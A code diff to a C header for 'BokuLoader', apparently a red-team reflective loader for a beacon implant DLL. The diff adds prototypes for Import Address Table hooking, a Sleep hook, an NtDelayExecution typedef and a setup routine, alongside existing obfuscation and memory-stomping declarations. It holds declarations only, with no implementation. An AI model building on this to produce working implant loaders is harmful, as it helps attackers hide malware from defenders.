@@ -1,7 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #define STATUS_SUCCESS 0x0
-#define SECTION( x )    __attribute__(( section( ".text$" #x ) ))
 
 typedef struct Export {
     void *   Directory;
@@ -276,7 +275,8 @@ typedef enum _MEMORY_INFORMATION_CLASS {
 } MEMORY_INFORMATION_CLASS;
 
 
-void * BokuLoader();
+void* Setup();
+void* BokuLoader();
 void checkObfuscate(Dll * raw_beacon_dll_struct);
 void checkUseRWX(Dll * raw_beacon_dll_struct);
 void * returnRDI();
@@ -337,6 +337,7 @@ typedef VOID (NTAPI * t_RtlInitAnsiString)(PANSI_STRING DestinationString, PCSZ 
 typedef NTSTATUS (NTAPI * t_LdrLoadDll)(OPTIONAL PWSTR DllPath, OPTIONAL PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID *DllHandle);
 typedef long(NTAPI* tNtQueryVirtualMemory)( HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
 typedef NTSTATUS  (NTAPI * t_NtUnmapViewOfSection)( IN HANDLE ProcessHandle, IN PVOID BaseAddress);
+typedef void*    (NTAPI * tNtDelayExecution)( BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
 
 typedef void*  (WINAPI * tGetProcessHeap)();
 typedef void*  (WINAPI * tHeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
@@ -367,7 +368,11 @@ void doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
 void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
 void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
 void stomp(unsigned __int64 length, unsigned char * buff);
-typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned int, void *);
+void* get_virtual_Hook_address(Dll * raw_beacon_dll, Dll * virtual_beacon_dll, void* raw_hook_address);
+void* check_and_write_IAT_Hook(char* EntryName, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
+void Sleep_Hook(DWORD dwMilliseconds);
+typedef void*  (WINAPI * DLLMAIN)(HINSTANCE, unsigned int, void *);
+BOOL StringCompareA( LPCSTR String1, LPCSTR String2 );
 
 #define NtCurrentProcess() ( (void *)(LONG_PTR) -1 )
 
